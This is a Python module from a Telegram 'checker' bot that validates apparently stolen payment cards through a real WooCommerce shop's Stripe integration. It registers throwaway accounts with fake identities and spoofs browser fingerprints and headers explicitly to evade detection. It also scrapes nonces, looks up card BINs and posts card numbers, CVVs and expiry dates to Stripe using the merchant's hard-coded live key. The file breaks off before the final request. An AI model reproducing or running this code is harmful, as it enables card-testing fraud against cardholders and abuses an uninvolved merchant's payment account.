# BOT/gates/auth/stripe/stauth.py
import json
import asyncio
import re
import time
import httpx
import random
import string
import logging
from datetime import datetime
from pyrogram import Client, filters
from pyrogram.types import Message
import html
from BOT.helper.permissions import auth_and_free_restricted
from BOT.helper.start import load_users, save_users

# Custom logger with emoji formatting
class EmojiLogger:
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.logger.setLevel(logging.WARNING)  # Only show WARNING and above by default
        # Prevent propagation to root logger
        self.logger.propagate = False

    def info(self, message):
        print(f"🔹 {message}")

    def success(self, message):
        print(f"✅ {message}")

    def warning(self, message):
        print(f"⚠️ {message}")

    def error(self, message):
        print(f"❌ {message}")

    def step(self, step_num, total_steps, message):
        print(f"🔸 [{step_num}/{total_steps}] {message}")

    def network(self, message):
        print(f"🌐 {message}")

    def card(self, message):
        print(f"💳 {message}")

    def stripe(self, message):
        print(f"🔄 {message}")

    def debug_response(self, message):
        print(f"🔧 {message}")

    def bin_info(self, message):
        print(f"🏦 {message}")

    def user(self, message):
        print(f"👤 {message}")

# Create global logger instance
logger = EmojiLogger()

# Suppress other loggers
logging.getLogger("pyrogram").setLevel(logging.ERROR)
logging.getLogger("httpx").setLevel(logging.ERROR)
logging.getLogger("httpcore").setLevel(logging.ERROR)
logging.getLogger("asyncio").setLevel(logging.ERROR)

def load_owner_id():
    try:
        with open("FILES/config.json", "r") as f:
            config_data = json.load(f)
            return config_data.get("OWNER")
    except:
        return None

def get_user_plan(user_id):
    users = load_users()
    user_id_str = str(user_id)
    if user_id_str in users:
        return users[user_id_str].get("plan", {})
    return {}

def is_user_banned(user_id):
    try:
        with open("DATA/banned_users.txt", "r") as f:
            banned_users = f.read().splitlines()
        return str(user_id) in banned_users
    except:
        return False

def check_cooldown(user_id, command_type="au"):
    """Check cooldown for user - SKIP FOR OWNER"""
    # Get owner ID
    owner_id = load_owner_id()

    # Skip cooldown check for owner
    if str(user_id) == str(owner_id):
        return True, 0

    try:
        with open("DATA/cooldowns.json", "r") as f:
            cooldowns = json.load(f)
    except:
        cooldowns = {}

    user_key = f"{user_id}_{command_type}"
    current_time = time.time()

    if user_key in cooldowns:
        last_time = cooldowns[user_key]
        user_plan = get_user_plan(user_id)
        antispam = user_plan.get("antispam", 15)

        if antispam is None:
            antispam = 15

        if current_time - last_time < antispam:
            return False, antispam - (current_time - last_time)

    cooldowns[user_key] = current_time
    try:
        with open("DATA/cooldowns.json", "w") as f:
            json.dump(cooldowns, f, indent=4)
    except:
        pass

    return True, 0

# REMOVED: update_user_credits function completely for this command
# This gate is FREE for all users, no credit deduction

class StripeAuthChecker:
    def __init__(self):
        # Modern browser user agents
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPad; CPU OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 14; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36"
        ]
        self.user_agent = random.choice(self.user_agents)
        self.bin_cache = {}
        self.last_bin_request = 0
        self.base_url = "https://simonapouchescy.com"
        self.stripe_key = "pk_live_51I6wp3COExl9jV4CcKbaN3EFxcAB50pTrNUO8OPoGViHyLMPXUBRLDgqu1kYLj1nLkW24fENgejrjKvodrvFaTBY00cQmieKcs"

        self.bin_services = [
            {
                'url': 'https://lookup.binlist.net/{bin}',
                'headers': {'Accept-Version': '3', 'User-Agent': self.user_agent},
                'name': 'binlist.net',
                'parser': self.parse_binlist_net
            },
            {
                'url': 'https://bins.antipublic.cc/bins/{bin}',
                'headers': {'User-Agent': self.user_agent},
                'name': 'antipublic.cc',
                'parser': self.parse_antipublic
            }
        ]

        # Generate random browser fingerprints
        self.generate_browser_fingerprint()

    def generate_browser_fingerprint(self):
        """Generate realistic browser fingerprints to bypass detection"""
        # Screen resolutions
        self.screen_resolutions = [
            "1920x1080", "1366x768", "1536x864", "1440x900", 
            "1280x720", "1600x900", "2560x1440", "3840x2160"
        ]

        # Timezones
        self.timezones = [
            "America/New_York", "America/Chicago", "America/Denver", 
            "America/Los_Angeles", "Europe/London", "Europe/Paris",
            "Asia/Tokyo", "Australia/Sydney"
        ]

        # Languages
        self.languages = [
            "en-US,en;q=0.9", "en-GB,en;q=0.8", "en-CA,en;q=0.9,fr;q=0.8",
            "en-AU,en;q=0.9", "de-DE,de;q=0.9,en;q=0.8", "fr-FR,fr;q=0.9,en;q=0.8"
        ]

        # Platform
        if "Windows" in self.user_agent:
            self.platform = "Win32"
            self.sec_ch_ua_platform = '"Windows"'
        elif "Macintosh" in self.user_agent:
            self.platform = "MacIntel"
            self.sec_ch_ua_platform = '"macOS"'
        elif "Linux" in self.user_agent:
            self.platform = "Linux x86_64"
            self.sec_ch_ua_platform = '"Linux"'
        elif "iPhone" in self.user_agent or "iPad" in self.user_agent:
            self.platform = "iPhone"
            self.sec_ch_ua_platform = '"iOS"'
        elif "Android" in self.user_agent:
            self.platform = "Linux armv8l"
            self.sec_ch_ua_platform = '"Android"'
        else:
            self.platform = "Win32"
            self.sec_ch_ua_platform = '"Windows"'

        # Randomize other fingerprint elements
        self.screen_resolution = random.choice(self.screen_resolutions)
        self.timezone = random.choice(self.timezones)
        self.accept_language = random.choice(self.languages)
        self.connection_type = random.choice(["keep-alive", "close"])

        # Generate Sec-CH-UA headers based on Chrome version
        chrome_version = re.search(r'Chrome/(\d+)', self.user_agent)
        if chrome_version:
            version = chrome_version.group(1)
            self.sec_ch_ua = f'"Not A;Brand";v="99", "Chromium";v="{version}", "Google Chrome";v="{version}"'
        else:
            self.sec_ch_ua = '"Not A;Brand";v="99", "Chromium";v="144", "Google Chrome";v="144"'

        # Generate Sec-CH-UA-Mobile
        self.sec_ch_ua_mobile = "?0" if "Mobile" not in self.user_agent else "?1"

    async def get_country_flag_emoji(self, country_code):
        """Get proper country flag emoji from antipublic.cc API"""
        if not country_code or country_code == 'N/A':
            return '🏳️'

        try:
            # Use antipublic.cc API to get flag emoji
            url = f"https://bins.antipublic.cc/bins/000000"
            async with httpx.AsyncClient(timeout=5.0) as client:
                response = await client.get(url)

                if response.status_code == 200:
                    data = response.json()

                    # Try to get flag from response
                    flag = data.get("country_flag", "")
                    if flag and flag != "N/A":
                        return flag

                    # If flag not available, fall back to country code
                    country = data.get("country_name", "")
                    if country and country != "N/A":
                        # Try to extract country code from country name
                        for code, name in self.country_emojis.items():
                            if country.lower() in name.lower() or name.lower() in country.lower():
                                return self.country_emojis.get(code, '🏳️')

        except Exception as e:
            logger.warning(f"Failed to fetch flag from API: {e}")

        # Fallback to hardcoded emojis
        return self.get_country_emoji(country_code)

    def get_country_emoji(self, country_code):
        """Hardcoded country emoji mapping with more countries"""
        country_emojis = {
            'US': '🇺🇸', 'GB': '🇬🇧', 'CA': '🇨🇦', 'AU': '🇦🇺', 'DE': '🇩🇪',
            'FR': '🇫🇷', 'IT': '🇮🇹', 'ES': '🇪🇸', 'JP': '🇯🇵', 'CN': '🇨🇳',
            'IN': '🇮🇳', 'BR': '🇧🇷', 'MX': '🇲🇽', 'RU': '🇷🇺', 'KR': '🇰🇷',
            'NL': '🇳🇱', 'CH': '🇨🇭', 'SE': '🇸🇪', 'NO': '🇳🇴', 'DK': '🇩🇰',
            'FI': '🇫🇮', 'PL': '🇵🇱', 'TR': '🇹🇷', 'AE': '🇦🇪', 'SA': '🇸🇦',
            'SG': '🇸🇬', 'MY': '🇲🇾', 'TH': '🇹🇭', 'ID': '🇮🇩', 'PH': '🇵🇭',
            'VN': '🇻🇳', 'BD': '🇧🇩', 'PK': '🇵🇰', 'NG': '🇳🇬', 'ZA': '🇿🇦',
            'EG': '🇪🇬', 'MA': '🇲🇦', 'DZ': '🇩🇿', 'TN': '🇹🇳', 'LY': '🇱🇾',
            'JO': '🇯🇴', 'LB': '🇱🇧', 'KW': '🇰🇼', 'QA': '🇶🇦', 'OM': '🇴🇲',
            'BH': '🇧🇭', 'IL': '🇮🇱', 'IR': '🇮🇷', 'IQ': '🇮🇷', 'SY': '🇸🇾',
            'YE': '🇾🇪', 'AF': '🇦🇫', 'LK': '🇱🇰', 'NP': '🇳🇵', 'BT': '🇧🇹',
            'MM': '🇲🇲', 'KH': '🇰🇭', 'LA': '🇱🇦', 'BN': '🇧🇳', 'TL': '🇹🇱',
            'PG': '🇵🇬', 'FJ': '🇫🇯', 'SB': '🇸🇧', 'VU': '🇻🇺', 'NC': '🇳🇨',
            'NZ': '🇳🇿', 'CK': '🇨🇰', 'WS': '🇼🇸', 'TO': '🇹🇴', 'TV': '🇹🇻',
            'KI': '🇰🇮', 'MH': '🇲🇭', 'FM': '🇫🇲', 'PW': '🇵🇼', 'GU': '🇬🇺',
            'MP': '🇲🇵', 'PR': '🇵🇷', 'VI': '🇻🇮', 'DO': '🇩🇴', 'HT': '🇭🇹',
            'JM': '🇯🇲', 'CU': '🇨🇺', 'BS': '🇧🇸', 'BB': '🇧🇧', 'TT': '🇹🇹',
            'GD': '🇬🇩', 'VC': '🇻🇨', 'LC': '🇱🇨', 'KN': '🇰🇳', 'AG': '🇦🇬',
            'DM': '🇩🇲', 'MS': '🇲🇸', 'TC': '🇹🇨', 'VG': '🇻🇬', 'AI': '🇦🇮',
            'BM': '🇧🇲', 'KY': '🇰🇾', 'FK': '🇫🇰', 'GS': '🇬🇸', 'SH': '🇸🇭',
            'PM': '🇵🇲', 'WF': '🇼🇫', 'TF': '🇹🇫', 'PF': '🇵🇫', 'NC': '🇳🇨',
            'RE': '🇷🇪', 'YT': '🇾🇹', 'MQ': '🇲🇶', 'GP': '🇬🇵', 'BL': '🇧🇱',
            'MF': '🇲🇫', 'SX': '🇸🇽', 'CW': '🇨🇼', 'AW': '🇦🇼', 'BQ': '🇧🇶',
            'SR': '🇸🇷', 'GF': '🇬🇫', 'GY': '🇬🇾', 'VE': '🇻🇪', 'CO': '🇨🇴',
            'EC': '🇪🇨', 'PE': '🇵🇪', 'BO': '🇧🇴', 'CL': '🇨🇱', 'AR': '🇦🇷',
            'UY': '🇺🇾', 'PY': '🇵🇾', 'HN': '🇭🇳', 'SV': '🇸🇻', 'NI': '🇳🇮',
            'CR': '🇨🇷', 'PA': '🇵🇦', 'GT': '🇬🇹', 'BZ': '🇧🇿', 'HN': '🇭🇳',
            'SV': '🇸🇻', 'NI': '🇳🇮', 'CR': '🇨🇷', 'PA': '🇵🇦', 'GT': '🇬🇹',
            'BZ': '🇧🇿', 'HN': '🇭🇳', 'SV': '🇸🇻', 'NI': '🇳🇮', 'CR': '🇨🇷',
            'PA': '🇵🇦', 'GT': '🇬🇹', 'BZ': '🇧🇿'
        }
        return country_emojis.get(country_code.upper() if country_code else 'N/A', '🏳️')

    def get_base_headers(self):
        """Get undetectable base headers"""
        return {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': self.accept_language,
            'Cache-Control': 'max-age=0',
            'Connection': self.connection_type,
            'DNT': '1',  # Do Not Track
            'Sec-CH-UA': self.sec_ch_ua,
            'Sec-CH-UA-Mobile': self.sec_ch_ua_mobile,
            'Sec-CH-UA-Platform': self.sec_ch_ua_platform,
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': self.user_agent,
            'Viewport-Width': self.screen_resolution.split('x')[0],
            'Width': self.screen_resolution.split('x')[0]
        }

    def parse_binlist_net(self, data):
        scheme = data.get('scheme', 'N/A').upper()
        if scheme == 'N/A':
            scheme = data.get('brand', 'N/A').upper()

        card_type = data.get('type', 'N/A').upper()
        brand = data.get('brand', 'N/A')
        bank_name = data.get('bank', {}).get('name', 'N/A').upper()
        country_name = data.get('country', {}).get('name', 'N/A')
        country_code = data.get('country', {}).get('alpha2', 'N/A')

        if country_name:
            country_name = country_name.replace('(the)', '').strip().upper()

        brand_display = brand.upper() if brand != 'N/A' else 'N/A'

        # Get flag emoji using improved method
        flag_emoji = self.get_country_emoji(country_code)

        return {
            'scheme': scheme,
            'type': card_type,
            'brand': brand_display,
            'bank': bank_name,
            'country': country_name,
            'country_code': country_code,
            'emoji': flag_emoji
        }

    def parse_antipublic(self, data):
        if isinstance(data, str):
            try:
                data = json.loads(data)
            except json.JSONDecodeError:
                return {
                    'scheme': 'N/A',
                    'type': 'N/A',
                    'brand': 'N/A',
                    'bank': 'N/A',
                    'country': 'N/A',
                    'country_code': 'N/A',
                    'emoji': '🏳️'
                }

        country_code = data.get('country', 'N/A')
        country_name = data.get('country_name', country_code)
        flag_emoji = data.get('country_flag', '🏳️')

        if country_name:
            country_name = country_name.replace('(the)', '').strip().upper()

        # If API didn't provide flag, try to get it
        if flag_emoji == '🏳️' or flag_emoji == 'N/A':
            if country_code != 'N/A' and len(country_code) == 2:
                # Try to get proper flag emoji
                flag_emoji = self.get_country_emoji(country_code)

        return {
            'scheme': data.get('brand', 'N/A').upper(),
            'type': data.get('type', 'N/A').upper(),
            'brand': data.get('brand', 'N/A').upper(),
            'bank': data.get('bank', 'N/A').upper(),
            'country': country_name,
            'country_code': country_code,
            'emoji': flag_emoji
        }

    async def get_bin_info(self, cc):
        """Get BIN information with proper flag handling"""
        if not cc or len(cc) < 6:
            return {
                'scheme': 'N/A',
                'type': 'N/A',
                'brand': 'N/A',
                'bank': 'N/A',
                'country': 'N/A',
                'country_code': 'N/A',
                'emoji': '🏳️'
            }

        bin_number = cc[:6]

        # Check cache first
        if bin_number in self.bin_cache:
            return self.bin_cache[bin_number]

        # Rate limiting
        now = time.time()
        if now - self.last_bin_request < 1.0:
            await asyncio.sleep(1.0)
        self.last_bin_request = time.time()

        default_response = {
            'scheme': 'N/A',
            'type': 'N/A',
            'brand': 'N/A',
            'bank': 'N/A',
            'country': 'N/A',
            'country_code': 'N/A',
            'emoji': '🏳️'
        }

        # Try antipublic.cc first (has better flag data)
        try:
            url = f"https://bins.antipublic.cc/bins/{bin_number}"
            headers = {'User-Agent': self.user_agent}

            async with httpx.AsyncClient(timeout=10.0) as client:
                response = await client.get(url, headers=headers)

                if response.status_code == 200:
                    data = response.json()

                    # Check if BIN not found
                    if "detail" in data and "not found" in data["detail"].lower():
                        logger.warning(f"BIN {bin_number} not found in antipublic.cc")
                    else:
                        # Parse antipublic data with proper flag handling
                        result = self.parse_antipublic(data)
                        self.bin_cache[bin_number] = result
                        return result
        except Exception as e:
            logger.warning(f"antipublic.cc failed: {e}")

        # Fallback to binlist.net
        for service in self.bin_services:
            if service['name'] == 'binlist.net':
                try:
                    url = service['url'].format(bin=bin_number)
                    headers = service['headers']

                    async with httpx.AsyncClient(timeout=10.0) as client:
                        response = await client.get(url, headers=headers)

                        if response.status_code == 200:
                            data = response.json()
                            result = service['parser'](data)

                            # Enhance result with better flag if available
                            if result['emoji'] == '🏳️' and result['country_code'] != 'N/A':
                                # Try to get better flag
                                better_flag = await self.get_country_flag_emoji(result['country_code'])
                                result['emoji'] = better_flag

                            self.bin_cache[bin_number] = result
                            return result
                except Exception as e:
                    logger.warning(f"binlist.net failed: {e}")
                    continue

        # If all fail, return default
        self.bin_cache[bin_number] = default_response
        return default_response

    async def format_response(self, cc, mes, ano, cvv, status, message, username, elapsed_time, user_data, bin_info=None):
        if bin_info is None:
            bin_info = await self.get_bin_info(cc)

        user_id = user_data.get("user_id", "Unknown")
        first_name = html.escape(user_data.get("first_name", "User"))
        badge = user_data.get("plan", {}).get("badge", "🎭")

        if "APPROVED" in status:
            status_emoji = "✅"
            status_text = "APPROVED"
        elif "DECLINED" in status:
            status_emoji = "❌"
            status_text = "DECLINED"
        else:
            status_emoji = "⚠️"
            status_text = status.upper() if status else "ERROR"

        clean_name = re.sub(r'[↯⌁«~∞🍁]', '', first_name).strip()
        user_display = f"「{badge}」{clean_name}"
        bank_info = bin_info['bank'].upper() if bin_info['bank'] != 'N/A' else 'N/A'

        # FIXED: Changed dev link from <a href="https://t.me/D_A_DYY">DADYY</a> to just <b><i>DADYY</i></b>
        response = f"""<b>「$cmd → /au」| <b>WAYNE</b> </b>
━━━━━━━━━━━━━━━
<b>[•] Card-</b> <code>{cc}|{mes}|{ano}|{cvv}</code>
<b>[•] Gateway -</b> Stripe Auth
<b>[•] Status-</b> <code>{status_text} {status_emoji}</code>
<b>[•] Response-</b> <code>{message}</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Bin:</b> <code>{cc[:6]}</code>  
<b>[+] Info:</b> <code>{bin_info['scheme']} - {bin_info['type']} - {bin_info['brand']}</code>
<b>[+] Bank:</b> <code>{bank_info}</code> 🏦
<b>[+] Country:</b> <code>{bin_info['country']}</code> [{bin_info['emoji']}]
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[ﾒ] Checked By:</b> {user_display}
<b>[ϟ] Dev ➺</b> <b><i>DADYY</i></b>
━━━━━━━━━━━━━━━
<b>[ﾒ] T/t:</b> <code>{elapsed_time:.2f} 𝐬</code> |<b>P/x:</b> <code>Live ⚡️</code></b>"""

        return response

    def get_processing_message(self, cc, mes, ano, cvv, username, user_plan):
        return f"""<b>「$cmd → /au」| <b>WAYNE</b> </b>
━━━━━━━━━━━━━━━
<b>[•] Card-</b> <code>{cc}|{mes}|{ano}|{cvv}</code>
<b>[•] Gateway -</b> Stripe Auth
<b>[•] Status-</b> Processing... ⏳
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Plan:</b> {user_plan}
<b>[+] User:</b> @{username}
━━━━━━━━━━━━━━━
<b>Checking card... Please wait.</b>"""

    async def create_authenticated_session(self):
        client = None
        try:
            # Create client with proper settings
            client = httpx.AsyncClient(
                timeout=30.0,
                follow_redirects=True,
                limits=httpx.Limits(max_keepalive_connections=5, max_connections=10),
                http2=True
            )

            # Step 1: Visit homepage
            logger.step(1, 6, "Getting registration page...")
            home_response = await client.get(f"{self.base_url}/", headers=self.get_base_headers())

            if home_response.status_code != 200:
                logger.error(f"Homepage failed: {home_response.status_code}")
                await client.aclose()
                return None, None, f"Failed to access site: {home_response.status_code}"

            await asyncio.sleep(random.uniform(1.0, 2.0))

            # Step 2: Go to my-account page
            logger.step(2, 6, "Registering account...")
            account_url = f"{self.base_url}/my-account-2/"

            headers = self.get_base_headers()
            headers['Referer'] = f"{self.base_url}/"

            account_response = await client.get(account_url, headers=headers)

            if account_response.status_code != 200:
                logger.error(f"My-account page failed: {account_response.status_code}")
                await client.aclose()
                return None, None, f"Failed to access my-account: {account_response.status_code}"

            await asyncio.sleep(random.uniform(1.0, 2.0))

            # Extract registration nonce
            account_text = account_response.text

            # Multiple patterns to find registration nonce
            patterns = [
                r'name="woocommerce-register-nonce" value="([a-f0-9]{8,12})"',
                r'"woocommerce-register-nonce":"([a-f0-9]{8,12})"',
                r'woocommerce-register-nonce.*?["\']([a-f0-9]{8,12})["\']',
                r'register_nonce["\']?[^>]*value=["\']([a-f0-9]{8,12})["\']',
                r'nonce["\']?[^>]*value=["\']([a-f0-9]{8,12})["\']'
            ]

            reg_nonce = None
            for pattern in patterns:
                match = re.search(pattern, account_text, re.IGNORECASE)
                if match:
                    reg_nonce = match.group(1)
                    logger.success(f"Found registration nonce: {reg_nonce}")
                    break

            if not reg_nonce:
                logger.error("Registration nonce not found")
                await client.aclose()
                return None, None, "Registration nonce not found"

            # Register new user
            register_success = await self.register_new_user(client, reg_nonce, account_response)

            if not register_success:
                logger.error("User registration failed")
                await client.aclose()
                return None, None, "Failed to register user"

            logger.success("User registration successful")
            await asyncio.sleep(random.uniform(1.0, 2.0))

            # Step 3: Go to add-payment-method page
            logger.step(3, 6, "Loading payment method page...")
            payment_url = f"{self.base_url}/my-account-2/add-payment-method/"

            headers = self.get_base_headers()
            headers['Referer'] = f"{self.base_url}/my-account-2/"

            payment_response = await client.get(payment_url, headers=headers)

            if payment_response.status_code != 200:
                logger.error(f"Payment page failed: {payment_response.status_code}")
                await client.aclose()
                return None, None, f"Payment page failed: {payment_response.status_code}"

            response_text = payment_response.text

            # Extract AJAX nonce
            nonce_patterns = [
                r'"createAndConfirmSetupIntentNonce":"([a-f0-9]{8,12})"',
                r'"_ajax_nonce":"([a-f0-9]{8,12})"',
                r'name="_ajax_nonce" value="([a-f0-9]{8,12})"',
                r'nonce["\']?[^>]*value=["\']([a-f0-9]{8,12})["\']',
                r'stripe_nonce["\']?[^>]*value=["\']([a-f0-9]{8,12})["\']'
            ]

            nonce = None
            for pattern in nonce_patterns:
                nonce_match = re.search(pattern, response_text, re.IGNORECASE)
                if nonce_match:
                    nonce = nonce_match.group(1)
                    logger.success(f"Found AJAX nonce: {nonce}")
                    break

            if not nonce:
                logger.error("AJAX nonce not found")
                await client.aclose()
                return None, None, "Nonce token not found"

            logger.success("Session creation completed")
            return client, nonce, "Success"

        except Exception as e:
            logger.error(f"Session creation failed: {str(e)}")
            try:
                if client:
                    await client.aclose()
            except:
                pass
            return None, None, f"Session creation failed: {str(e)}"

    async def register_new_user(self, client, reg_nonce, previous_response=None):
        try:
            # Generate realistic user details
            random_id = random.randint(100000, 999999)
            first_names = ["John", "Jane", "Robert", "Mary", "David", "Sarah", "Michael", "Lisa", "James", "Emma"]
            last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]

            first_name = random.choice(first_names)
            last_name = random.choice(last_names)
            username = f"{first_name.lower()}{last_name.lower()}{random.randint(10, 99)}"

            domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "icloud.com", "protonmail.com"]
            domain = random.choice(domains)
            email = f"{username}@{domain}"

            # Generate strong password
            password = f"{first_name}{random.randint(1000, 9999)}!{random.choice(['@', '#', '$', '&'])}"

            reg_url = f"{self.base_url}/my-account-2/"

            # Try to extract wp_http_referer from previous response
            wp_http_referer = "/my-account-2/"
            if previous_response:
                wp_referer_match = re.search(r'name="_wp_http_referer"[^>]*value="([^"]*)"', previous_response.text)
                if wp_referer_match:
                    wp_http_referer = wp_referer_match.group(1)

            # Prepare registration data
            current_time = datetime.now()
            session_start = current_time.replace(second=random.randint(0, 59))

            reg_data = {
                'username': username,
                'email': email,
                'password': password,
                'mailchimp_woocommerce_newsletter': '1',
                'wc_order_attribution_source_type': 'typein',
                'wc_order_attribution_referrer': '(none)',
                'wc_order_attribution_utm_campaign': '(none)',
                'wc_order_attribution_utm_source': '(direct)',
                'wc_order_attribution_utm_medium': '(none)',
                'wc_order_attribution_utm_content': '(none)',
                'wc_order_attribution_utm_id': '(none)',
                'wc_order_attribution_utm_term': '(none)',
                'wc_order_attribution_utm_source_platform': '(none)',
                'wc_order_attribution_utm_creative_format': '(none)',
                'wc_order_attribution_utm_marketing_tactic': '(none)',
                'wc_order_attribution_session_entry': f'{self.base_url}/',
                'wc_order_attribution_session_start_time': session_start.strftime('%Y-%m-%d %H:%M:%S'),
                'wc_order_attribution_session_pages': str(random.randint(1, 3)),
                'wc_order_attribution_session_count': '1',
                'wc_order_attribution_user_agent': self.user_agent,
                'woocommerce-register-nonce': reg_nonce,
                '_wp_http_referer': wp_http_referer,
                'register': 'Register'
            }

            headers = self.get_base_headers()
            headers.update({
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': self.base_url,
                'Referer': reg_url,
                'Cache-Control': 'max-age=0',
                'Upgrade-Insecure-Requests': '1'
            })

            # POST registration request
            response = await client.post(reg_url, data=reg_data, headers=headers, follow_redirects=True)

            # Check for success indicators
            response_text = response.text.lower()
            response_cookies = str(response.cookies).lower()

            success_indicators = [
                'wordpress_logged_in',
                'woocommerce_items_in_cart',
                'registration complete',
                'my account',
                'dashboard',
                'log out',
                'logout',
                'welcome,',
                'hello,',
                'your account'
            ]

            success_found = False
            for indicator in success_indicators:
                if indicator in response_text or indicator in response_cookies:
                    success_found = True
                    break

            if (response.status_code in [200, 302]) and success_found:
                return True
            else:
                # Try alternative: maybe username field is not needed
                try:
                    del reg_data['username']
                    response2 = await client.post(reg_url, data=reg_data, headers=headers, follow_redirects=True)

                    if response2.status_code in [200, 302]:
                        return True
                except:
                    pass

                return False

        except Exception as e:
            return False

    async def check_card(self, card_details, username, user_data):
        start_time = time.time()
        cc, mes, ano, cvv = "", "", "", ""
        client = None

        try:
            logger.info(f"🔍 Starting Stripe Auth check: {card_details[:12]}XXXX{card_details[-4:] if len(card_details) > 4 else ''}")

            cc_parts = card_details.split('|')
            if len(cc_parts) < 4:
                return await self.format_response("", "", "", "", "ERROR", "Invalid card format. Use: CC|MM|YY|CVV", username, time.time()-start_time, user_data)

            cc = cc_parts[0].strip().replace(" ", "")
            mes = cc_parts[1].strip()
            ano = cc_parts[2].strip()
            cvv = cc_parts[3].strip()

            # Validate card details
            if not cc.isdigit() or len(cc) < 15:
                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid card number", username, time.time()-start_time, user_data)

            if not mes.isdigit() or len(mes) not in [1, 2] or not (1 <= int(mes) <= 12):
                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid month", username, time.time()-start_time, user_data)

            if not ano.isdigit() or len(ano) not in [2, 4]:
                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid year", username, time.time()-start_time, user_data)

            if not cvv.isdigit() or len(cvv) not in [3, 4]:
                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid CVV", username, time.time()-start_time, user_data)

            if len(ano) == 2:
                ano = '20' + ano

            # Get BIN info with proper flag handling
            bin_info = await self.get_bin_info(cc)
            logger.bin_info(f"BIN: {cc[:6]} | {bin_info['scheme']} - {bin_info['type']} | {bin_info['bank']} | {bin_info['country']} [{bin_info['emoji']}]")

            # Create authenticated session
            max_attempts = 2
            client, nonce, session_msg = None, None, ""

            for attempt in range(max_attempts):
                logger.network(f"Session creation attempt {attempt + 1}/{max_attempts}")
                client, nonce, session_msg = await self.create_authenticated_session()
                if nonce:
                    break
                if attempt < max_attempts - 1:
                    await asyncio.sleep(random.uniform(2.0, 4.0))

            if not nonce:
                return await self.format_response(cc, mes, ano, cvv, "ERROR", f"Session failed: {session_msg}", username, time.time()-start_time, user_data, bin_info)

            # Create Stripe payment method
            logger.step(4, 6, "Creating Stripe payment method...")

            # Generate realistic browser fingerprints for Stripe
            client_session_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=36))
            guid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)) + ''.join(random.choices(string.digits, k=5))
            muid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)) + ''.join(random.choices(string.digits, k=5))
            sid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)) + ''.join(random.choices(string.digits, k=5))

            postal_code = random.choice(['10080', '90210', '33101', '60601', '75201', '94102', '98101', '20001'])

            stripe_data = {
                'type': 'card',
                'card[number]': cc,
                'card[cvc]': cvv,
                'card[exp_year]': ano,
                'card[exp_month]': mes,
                'allow_redisplay': 'unspecified',
                'billing_details[address][postal_code]': postal_code,
                'billing_details[address][country]': 'US',
                'pasted_fields': 'number',
                'payment_user_agent': f'stripe.js/{random.choice(["065b474d33", "8e9b241db6", "a1b2c3d4e5"])}; stripe-js-v3/{random.choice(["065b474d33", "8e9b241db6", "a1b2c3d4e5"])}; payment-element; deferred-intent',
                'referrer': self.base_url,
                'time_on_page': str(random.randint(30000, 120000)),
                'client_attribution_metadata[client_session_id]': client_session_id,
                'client_attribution_metadata[merchant_integration_source]': 'elements',
                'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
                'client_attribution_metadata[merchant_integration_version]': str(random.randint(2021, 2024)),
                'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
                'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
                'client_attribution_metadata[elements_session_config_id]': ''.join(random.choices(string.ascii_lowercase + string.digits, k=36)),
                'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
                'guid': guid,
                'muid': muid,
                'sid': sid,
                'key': self.stripe_key,
                '_stripe_version': '2024-06-20'
            }

            stripe_headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': self.user_agent,
                'sec-ch-ua': self.sec_ch_ua,
                'sec-ch-ua-mobile': self.sec_ch_ua_mobile,
                'sec-ch-ua-platform': self.sec_ch_ua_platform
            }

